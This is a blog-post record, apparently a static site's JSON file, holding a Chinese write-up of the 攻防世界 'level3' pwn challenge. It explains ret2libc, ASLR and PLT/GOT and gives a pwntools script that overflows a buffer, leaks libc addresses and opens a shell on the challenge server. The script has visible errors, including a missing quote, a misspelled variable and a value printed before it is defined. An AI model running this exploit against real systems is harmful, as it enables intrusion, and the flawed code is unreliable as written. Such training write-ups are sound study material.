{"title":"攻防世界 level3","slug":"攻防世界-pwn-level3","date":"2020-05-08","updated":"2020-09-10","comments":true,"path":"api/posts/5353.json","excerpt":null,"cover":"https://i.loli.net/2020/05/08/uFc1bxINidnvHVl.png","covers":["https://i.loli.net/2020/05/08/uFc1bxINidnvHVl.png","https://i.loli.net/2020/05/08/eFk7XyEv6ZKtGxd.png","https://i.loli.net/2020/05/08/doMwxehS3tCsbFq.png"],"content":"<p> 这道题对于我来讲好难好难啊，涉及到了很多新的知识。<br> 首先 checksec</p>\n<p><img src=\"https://i.loli.net/2020/05/08/uFc1bxINidnvHVl.png\" alt=\"17627983-3b321a2edea9a331.png\"></p>\n<p>: 可以直接栈溢出；基地址不变化；对数据有执行权限。</p>\n<p> 查看 main() 函数：</p>\n<p><img src=\"https://i.loli.net/2020/05/08/eFk7XyEv6ZKtGxd.png\" alt=\"17627983-fde84f52ba2311ab.png\"></p>\n<p> 查看函数 function()：</p>\n<p><img src=\"https://i.loli.net/2020/05/08/doMwxehS3tCsbFq.png\" alt=\"捕获.PNG\"></p>\n<p> 无 system, 无 /bin/sh，给了一个共享文件 libc_32.so.6, 明显为 ret2libc。</p>\n<blockquote>\n<p>ret2libc (return-into-libc) 是一种利用缓冲区溢出的代码复用技术，主要通过覆盖栈帧的返回地址（EIP），使其返回到系统中的库函数，利用库函数中已有的功能来实施 attack，而不是直接定位到注入的 shellcode。system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变，用工具来找到对应的 libc 文件。</p>\n</blockquote>\n<blockquote>\n<p>ret2libc 特征：1、没有 /bin/sh；2、没有 system 和 /bin/sh；3、无 system 和 /bin/sh，但是给了 libc.so 文件；4、这三个全都没有。</p>\n</blockquote>\n<blockquote>\n<p>ASLR：地址空间布局随机化，ios,android,windows,macos,linux 的当前版本都具有 ASLR 保护。主要用于防止缓冲区溢出攻击，ASLR 与虚拟内存管理一起工作，将程序的不同部分的位置随机化，令攻击者不能通过尝试和错误了解目标位置，因为地址将不同。</p>\n</blockquote>\n<p>read() 函数中，buf 大小为 0x88，但是在函数中竟然规定了 256 之大。明显的栈溢出。</p>\n<h3 id=\"攻击思路\"><a href=\"# 攻击思路\" class=\"headerlink\" title=\"攻击思路\"></a> 攻击思路 </h3><p>libc 内的地址是随机的，但是函数的相对地址是不变的，只要知道其中某一个函数的地址，再利用相对位移计算出我们所需要的函数的地址，如果知道 read 或 write 函数的地址就可以计算出其他函数的地址。</p>\n<p> 某大佬攻击思路：</p>\n<p>（1）通过 function() 中的 read 构造栈溢出，并且覆写返回地址为 plt 中的 write 地址。（2）通过 wirte 泄露 read 在内存中的绝对地址，并且接着调用 function()（注：got 中的 read 保存着 read 在内存中的真实地址）（3）计算出 system 和 /bin/sh 的绝对地址，再通过 function 构造栈溢出进行覆写。（4）成功 </p>\n<blockquote>\n<p>plt：procedure Linkage Table，延迟绑定，函数第一次用到时才进行绑定（符号查找，重定位等）；<br> 实现手法：增加一层间接跳转。<br> 调用函数时并不直接通过 GOT 跳转，而是通过一个叫做 PLT 的项的结构来进行跳转，每个外部函数在 PLT 中都有一个相应的项。<br>ELF 将 GOT 拆分成两个表叫做.got 和.got.plt。<br>.got 用来保存全局变量引用的地址 <br>.got.plt 用来保存函数引用的地址，外部函数的引用全部放到 .plt.got 中。</p>\n</blockquote>\n<p><strong> 思路 </strong> </p>\n<p> 通过 read 覆盖返回地址没执行两次 main 函数，第一次泄露 write 函数的地址，第二次执行 system 函数。</p>\n<p>exp:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import*</span><br><span class=\"line\">p&#x3D;remote(&#39;111.198.29.45&#39;,52277)</span><br><span class=\"line\"> # p&#x3D;process(&quot;.&#x2F;level3&quot;)</span><br><span class=\"line\"> # 获取文件对象 </span><br><span class=\"line\">elf&#x3D;ELF(&#39;.&#x2F;level3&#39;)</span><br><span class=\"line\"> #获取 lib 库对象 </span><br><span class=\"line\">libc&#x3D;ELF(&#39;.&#x2F;libc_32.so.6&#39;)</span><br><span class=\"line\"> #获取函数 </span><br><span class=\"line\">wirte_plt&#x3D;elf.plt[&#39;write&#39;]</span><br><span class=\"line\">write_got&#x3D;elf.got[write&#39;]</span><br><span class=\"line\">main_addr&#x3D;elf.sym[&#39;main&#39;]</span><br><span class=\"line\"> #接受数据 </span><br><span class=\"line\">p.recvuntil(&quot;:\\n&quot;)</span><br><span class=\"line\">  #char[88],ebp write 函数地址，write 函数返回地址（返回到 main 函数） write 函数参数一（1）  write 函数参数二（write_got 的地址）write 参数三（写 4 字节）</span><br><span class=\"line\">payload&#x3D;0x88*&#39;a&#39;+p32(0xdeadbeef)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"> #获取 wirte 在 got 中的地址 </span><br><span class=\"line\">write_got_addr&#x3D;u32(p.recv())</span><br><span class=\"line\">print hex(write_got_addr)</span><br><span class=\"line\"> # 计算 lib 库加载基址 </span><br><span class=\"line\">libc_base&#x3D;write_got_addr-libc.sym[&#39;write&#39;]</span><br><span class=\"line\">print hex(libc_base)</span><br><span class=\"line\"> # 计算 system 的地址 </span><br><span class=\"line\">system_addr&#x3D;libc_base+libc.sym[&#39;system&#39;]</span><br><span class=\"line\">print hex(bin_sh_addr)</span><br><span class=\"line\"> #计算字符串 &#x2F;bin&#x2F;sh 的地址。0x15902b 为偏移，通过命令：strings -a -t x libc_32.so.6 | grep &quot;&#x2F;bin&#x2F;sh&quot; 获取 </span><br><span class=\"line\">bin_sh_addr&#x3D;libc_base+0x15902b</span><br><span class=\"line\">print hex(bin_sh_addr)</span><br><span class=\"line\"> #char [88] ebp system system 函数的返回地址 system 函数的参数 (bin_sh_addr)</span><br><span class=\"line\">payload2&#x3D;0x88*&#39;a&#39;+p32(0xdeadbeef)+p32(system_addr)+p32(0x11111111)+p32(bin_sh_addr)</span><br><span class=\"line\"> #接受数据 </span><br><span class=\"line\">p.recvuntil(&quot;:\\n&quot;)</span><br><span class=\"line\"> #发送 payloas</span><br><span class=\"line\">p.sendline(payload2)</span><br><span class=\"line\"> #切换交互模式 </span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n","url":"/posts/5353/","min2read":4,"word4post":"1.1k","prev_post":{"title":"Loving strangers","url":"/posts/15058/"},"next_post":null,"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"攻击思路\" href = \"#\"><span class=\"toc-number\">1.</span> <span class=\"toc-text\"> 攻击思路 </span></a></li></ol>","categories":[],"tags":[{"name":"pwn","path":"api/tags/pwn.json","url":"/tags/pwn/"}]}